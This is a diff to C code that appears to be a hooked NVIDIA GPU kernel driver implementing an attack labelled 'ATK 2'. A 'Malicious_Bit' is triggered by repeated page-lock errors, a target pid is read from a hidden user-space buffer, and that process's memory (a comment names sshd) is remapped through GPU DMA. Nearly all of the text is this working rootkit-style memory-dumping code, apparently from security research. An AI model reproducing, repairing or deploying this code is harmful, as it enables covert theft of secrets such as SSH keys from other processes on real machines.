@@ -429,7 +429,7 @@ static unsigned char old_mlock_opcode[5];
 
 static long get_pfn_of_virtual_address(unsigned long, unsigned long *);
 static long get_pfn_of_virtual_address_pid(unsigned long, unsigned long *, int);
-static void get_vm_area_by_pid(int);
+static int get_vm_area_by_pid(int);
 static void get_dump_addr(void);
 
 static unsigned long global_hidden_addr = 0x4000000;
@@ -641,13 +641,16 @@ NvU64 NV_API_CALL os_get_num_phys_pages(void)
 }
 
 
-static void get_vm_area_by_pid(int pid) {
+static int get_vm_area_by_pid(int pid) {
 
 	struct task_struct *task;
 	struct mm_struct *mm1;
 
 	// Get task structure by pid
 	task = pid_task(find_vpid(pid), PIDTYPE_PID);
+	if (! task) {
+		return NULL;
+	}
 
 	//Get VMA of Current tsk struct. CHANGE if you want different Proc.
 	mm1 = task->mm;
@@ -657,6 +660,7 @@ static void get_vm_area_by_pid(int pid) {
 	}
 
 	dump_vm_area = mm1->mmap;
+	return 1;
 }
 
 static void get_dump_addr(void) {
@@ -743,21 +747,21 @@ RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
 		                PAGE_SIZE,
 		                PCI_DMA_BIDIRECTIONAL);
 
-				DbgPrint( "*** ATK 2, pte_array[i] is 0x%llx ***\n",pte_array[i]);
-				DbgPrint( "*** Page size is: %d\n",PAGE_SIZE);
+//				DbgPrint( "*** ATK 2, pte_array[i] is 0x%llx ***\n",pte_array[i]);
+//				DbgPrint( "*** Page size is: %d\n",PAGE_SIZE);
 
 #if 1
-				if (counter==0 ) // First is for setting up the adress through which the info will be passed
-				{
 					if (Malicious_Bit==1)
 					{
 						counter++;
 						DbgPrint( "*** Counter = %d ***, Mal bit was %d\n",counter,Malicious_Bit);
 //						Malicious_Bit = 0;
+						DbgPrint( "page of hidden buffer: 0x%llx\n",dma_map->user_pages[i]);
 					}
-					DbgPrint( "*** Counter = %d ***\n",counter);
-					DbgPrint( "page of hidden buffer: 0x%llx\n",dma_map->user_pages[i]);
 
+				if (counter==1 ) // First is for setting up the adress through which the info will be passed
+				{
+					#if 1
 					rets = os_alloc_mem((void **)&info_buffer, sizeof(hidden_driver_info));
 					if (rets != RM_OK)
 		   			{
@@ -767,11 +771,12 @@ RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
 		   			     return rets;
 		    		}
 
-					rets=copy_from_user((void*)info_buffer,(void*)global_hidden_addr,sizeof(hidden_driver_info));
+					DbgPrint("COPY_FROM_USER global_hidden_addr = %llx\n", global_hidden_addr);
+					rets=copy_from_user((void*)info_buffer, (void*)global_hidden_addr, sizeof(hidden_driver_info));
 
 					if (rets != RM_OK)
 		   			{
-		   			     DbgPrint( "ATK 2: failed to copy from user!\n");
+		   			     DbgPrint( "ATK 2: failed to copy from usear! global_hidden_addr = %llx\n", global_hidden_addr);
 //		   			     counter = 0;
 //		   			     Malicious_Bit = 0;
 		   			     return rets;
@@ -783,8 +788,42 @@ RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
 
 					get_vm_area_by_pid(dump_pid);
 					get_dump_addr();
+#endif
+				}
 
-				} else {
+			  if (counter > 1) {
+#if 0
+					rets = os_alloc_mem((void **)&info_buffer, sizeof(hidden_driver_info));
+					if (rets != RM_OK)
+		   			{
+		   			     DbgPrint("YR: failed to allocate buffer in kernel mode!\n");
+//		   			     counter = 0;
+//		   			     Malicious_Bit = 0;
+		   			     return rets;
+		    		}
+
+					DbgPrint("COPY_FROM_USER global_hidden_addr = %llx\n", global_hidden_addr);
+					rets=copy_from_user((void*)info_buffer,(void*)global_hidden_addr,sizeof(hidden_driver_info));
+
+					if (rets != RM_OK)
+		   			{
+		   			     DbgPrint( "ATK 2: failed to copy from usear! global_hidden_addr = %llx\n", global_hidden_addr);
+//		   			     counter = 0;
+//		   			     Malicious_Bit = 0;
+		   			     return rets;
+		   			}
+					DbgPrint( "*** buffer contains after copy: pid = %d\n", info_buffer->pid);
+
+					// Currently hard-coded sshd page addr:
+					dump_pid = info_buffer->pid;
+
+					rets = get_vm_area_by_pid(dump_pid);
+					if (! rets) {
+						DbgPrint("Process not exists!\n");
+						return -1;
+					}
+					get_dump_addr();
+#endif
 
 					// Now remapping according to what was passed in buffer.
 					DbgPrint( "*** Counter = %d ***\n",counter);
@@ -805,7 +844,7 @@ RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
 					up_read(&mm->mmap_sem);
 		    		if (ret < 0)
 		    		{
-		    			DbgPrint("ATK 2: failed to get user pages\n");
+		    			DbgPrint("ATK 2: failed to get user pages: %lld\n", sshd_page_addr);
 //              counter = 0;
 //						  Malicious_Bit = 0;
 		    			return RM_ERR_INVALID_ADDRESS;
@@ -854,6 +893,7 @@ RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
 
 		    return RM_OK;
 }
+
 typedef RM_STATUS (*NV_API_CALL p_new_funct)( nv_state_t *nv,
 	    NvU64       page_count,
 	    NvU64      *pte_array,
@@ -903,18 +943,18 @@ RM_STATUS NV_API_CALL new_os_lock_user_pages(
     {
     	if (Mal_lock == 0)
     	{
-    		DbgPrint("***YR NVRM: Error in getUPages N.%d ***/n",Mal_lock);
+    		DbgPrint("***YR NVRM: Error in getUPages N.%d ***\n",Mal_lock);
     		Mal_lock++;
     	}
     	else if (Mal_lock == 1)
     	{
-    		DbgPrint("***YR NVRM: Error in getUPages N.%d ***/n",Mal_lock);
+    		DbgPrint("***YR NVRM: Error in getUPages N.%d ***\n",Mal_lock);
     		Mal_lock++;
     	}
     	else if (Mal_lock == 2)
     	{
-    		DbgPrint("***YR NVRM: 3 Errors in a a row. Unlocking Malcious Bit!****/n");
-    		Malicious_Bit = ~Malicious_Bit;
+    		DbgPrint("***YR NVRM: 3 Errors in a a row. Unlocking Malcious Bit!****\n");
+    		Malicious_Bit = (Malicious_Bit == 0) ? 1 : 0;
 
     	}
         os_free_mem(user_pages);
@@ -929,10 +969,10 @@ RM_STATUS NV_API_CALL new_os_lock_user_pages(
     }
     if (Malicious_Bit == 1)
     {
-    	DbgPrint("***YR NVRm: Mal bit was 1, hidden buffer gets addr/n");
 			if (first == 0) {
 				first ++;
     	  global_hidden_addr = (unsigned long)address;
+				DbgPrint("Writing global_hidden_addr: %llx\n", address);
 			}
     } else if (Malicious_Bit == 0) {
 			first = 0;
